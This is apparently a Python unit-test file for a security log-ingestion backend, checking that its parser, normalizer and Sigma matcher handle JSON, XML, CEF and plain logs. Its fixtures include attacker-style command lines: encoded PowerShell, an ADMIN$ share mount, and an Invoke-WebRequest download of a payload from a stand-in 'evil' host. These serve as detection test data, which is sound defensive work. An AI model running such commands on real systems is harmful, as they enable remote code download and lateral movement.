import json
import unittest

from helpers import BACKEND_DIR  # noqa: F401
from ingestion.log_parser import LogParser
from ingestion.normalizer import LogNormalizer
from ingestion.sigma_matcher import SigmaMatcher


class IngestionPipelineTests(unittest.TestCase):
    def test_json_parser_preserves_structured_values(self):
        content = json.dumps(
            [
                {
                    "timestamp": "2026-04-25T10:00:00Z",
                    "host": "WORKSTATION-01",
                    "event_type": "login",
                    "dest_host": None,
                    "dest_ip": "null",
                    "raw": "structured auth event",
                }
            ]
        )

        event = LogParser().parse_content(content)[0]

        self.assertEqual(event["event_type"], "auth")
        self.assertEqual(event["source_host"], "WORKSTATION-01")
        self.assertIsNone(event["dest_host"])
        self.assertIsNone(event["dest_ip"])

    def test_json_lines_parser_skips_invalid_lines(self):
        content = "\n".join(
            [
                '{"timestamp":"2026-04-25T10:00:00Z","host":"WKSTN-01","raw":"powershell.exe -enc SQBFAFgA"}',
                "not-json",
                '{"timestamp":"2026-04-25T10:01:00Z","host":"WKSTN-02","raw":"net use \\\\\\\\DC-01\\\\ADMIN$"}',
            ]
        )

        events = LogParser().parse_content(content)

        self.assertEqual(len(events), 2)
        self.assertEqual(events[0]["source_host"], "WKSTN-01")
        self.assertEqual(events[1]["source_host"], "WKSTN-02")

    def test_xml_cef_and_generic_formats_parse(self):
        xml = """
        <Event>
          <System>
            <EventID>4624</EventID>
            <TimeCreated SystemTime="2026-04-25T10:00:00Z" />
            <Computer>DC-01</Computer>
          </System>
          <EventData><Data Name="IpAddress">10.0.0.5</Data></EventData>
        </Event>
        """
        cef = "CEF:0|Vendor|Product|1|100|PowerShell execution|8|rt=2026-04-25T10:00:00Z shost=WKSTN-01 src=10.0.0.4"
        generic = "2026-04-25T10:02:00Z 10.0.0.4 connected to 10.0.0.8 over tcp"

        xml_event = LogParser().parse_content(xml)[0]
        cef_event = LogParser().parse_content(cef)[0]
        generic_event = LogParser().parse_content(generic)[0]

        self.assertEqual(xml_event["event_type"], "auth")
        self.assertEqual(xml_event["source_host"], "DC-01")
        self.assertEqual(cef_event["event_type"], "process")
        self.assertEqual(cef_event["source_ip"], "10.0.0.4")
        self.assertEqual(generic_event["event_type"], "network")
        self.assertEqual(generic_event["dest_ip"], "10.0.0.8")

    def test_sigma_matcher_returns_unique_technique_ids(self):
        matches = SigmaMatcher().match_event(
            "powershell.exe -EncodedCommand AAAA Invoke-WebRequest http://evil/payload.exe"
        )

        self.assertIn("T1059.001", matches)
        self.assertIn("T1105", matches)
        self.assertEqual(len(matches), len(set(matches)))

    def test_normalizer_enriches_events_and_scores_iocs(self):
        content = json.dumps(
            {
                "timestamp": "2026-04-25 10:00:00",
                "host": "WKSTN-01",
                "raw": "powershell.exe -enc SQBFAFgA net use \\\\DC-01\\ADMIN$",
            }
        )

        event = LogNormalizer().normalize_content(content)[0]

        self.assertTrue(event.enriched)
        self.assertIn("T1059.001", event.sigma_matches)
        self.assertGreater(event.ioc_score, 0)
        self.assertTrue(event.timestamp.startswith("2026-04-25T10:00:00"))

    def test_timestamp_normalization_handles_epoch_seconds(self):
        normalized = LogNormalizer()._normalize_timestamp("1710000000")

        self.assertTrue(normalized.startswith("2024-03-09T16:00:00"))
        self.assertTrue(normalized.endswith("Z"))


if __name__ == "__main__":
    unittest.main()
